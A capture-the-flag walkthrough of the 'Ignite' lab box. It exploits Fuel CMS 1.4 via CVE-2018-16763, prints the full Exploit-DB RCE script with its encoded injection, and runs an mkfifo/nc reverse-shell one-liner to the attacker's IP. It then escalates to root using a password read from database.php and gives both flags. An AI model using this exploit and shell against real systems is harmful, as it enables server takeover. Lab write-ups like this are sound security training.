# Ignite

## Description

A new start-up has a few issues with their web server.

Root the box! Designed and created by DarkStar7471, built by Paradox.

## Initial Scan

Let's start with an Nmap scan. The scan reveals one open port:
* 80 http

~~~
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
~~~

## Web

Let's start enumerating our only port which is the web service. The main page is the default page for `Fuel CMS` and the version is `1.4`:

<p align="center"><img src="./files/version.png"></p>

I also found a login page from `/robots.txt` under the name of `/fuel` and the credentials are `admin:admin`:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Ignite]
└─$ curl -s "http://$IP/robots.txt"                                                      
User-agent: *
Disallow: /fuel/
~~~

## Exploit

I checked if the version is outdated or not. I searched for it and found `CVE-2018-16763`. This version is vulnerable to RCE (Remote Code Execution) and I found an exploit for it [here](https://www.exploit-db.com/exploits/47138).

Here is the exploit:
~~~py
import requests
import urllib

url = "http://127.0.0.1:80"

def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = input('cmd:')
	url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	r = requests.get(url)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print (r.text[0:dup])
~~~

I had to modify the code a bit, because there is no proxy in our case. Don't forget to change the url and btw, you have to execute commands like this: `"<command>"`.


## Reverse Shell

I tested the exploit and it works. Let's execute a bash reverse shell. First start a listener and then execute the following:

~~~
cmd:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR IP> 4444 >/tmp/f"
~~~

Now we have a shell and the first thing I did was spawning a TTY shell using a python one-liner:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Ignite]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.2.173] from (UNKNOWN) [10.10.134.57] 44720
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/var/www/html$
~~~

## User flag

I found the user flag in `/home/www-data`:

~~~
www-data@ubuntu:/var/www/html$ cd /home/www-data
www-data@ubuntu:/home/www-data$ cat flag.txt
6470e394cbf6dab6a91682cc8585059b
~~~

User.txt: `6470e394cbf6dab6a91682cc8585059b`

## Going root

Now we need to gain root access in order to obtain the root flag. I started manually enumerating the machine and found this file: `/var/www/html/fuel/application/config/database.php`. After checking its content, I found the root's password in the last few lines:

~~~php
$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',      <--------------
	'password' => 'mememe',    <--------------
	'database' => 'fuel_schema',
	'dbdriver' => 'mysqli',
	'dbprefix' => '',
	'pconnect' => FALSE,
	'db_debug' => (ENVIRONMENT !== 'production'),
	'cache_on' => FALSE,
	'cachedir' => '',
	'char_set' => 'utf8',
	'dbcollat' => 'utf8_general_ci',
	'swap_pre' => '',
	'encrypt' => FALSE,
	'compress' => FALSE,
	'stricton' => FALSE,
	'failover' => array(),
	'save_queries' => TRUE
);
~~~

Now we can simply switch to root:

~~~
www-data@ubuntu:/var/www/html/fuel/application/config$ su root
Password: mememe

root@ubuntu:/var/www/html/fuel/application/config# id
uid=0(root) gid=0(root) groups=0(root)
~~~

## Root Flag

Now we can easily navigate to `/root` and read the root flag:

~~~
root@ubuntu:/var/www/html/fuel/application/config# cd /root
root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt
b9bbcb33e11b80be759c4e844862482d 
~~~
Root.txt: `b9bbcb33e11b80be759c4e844862482d`

# D0N3! ; )

Thanks to the creators!

Hope you had fun and learned something!

Have a g00d one! : )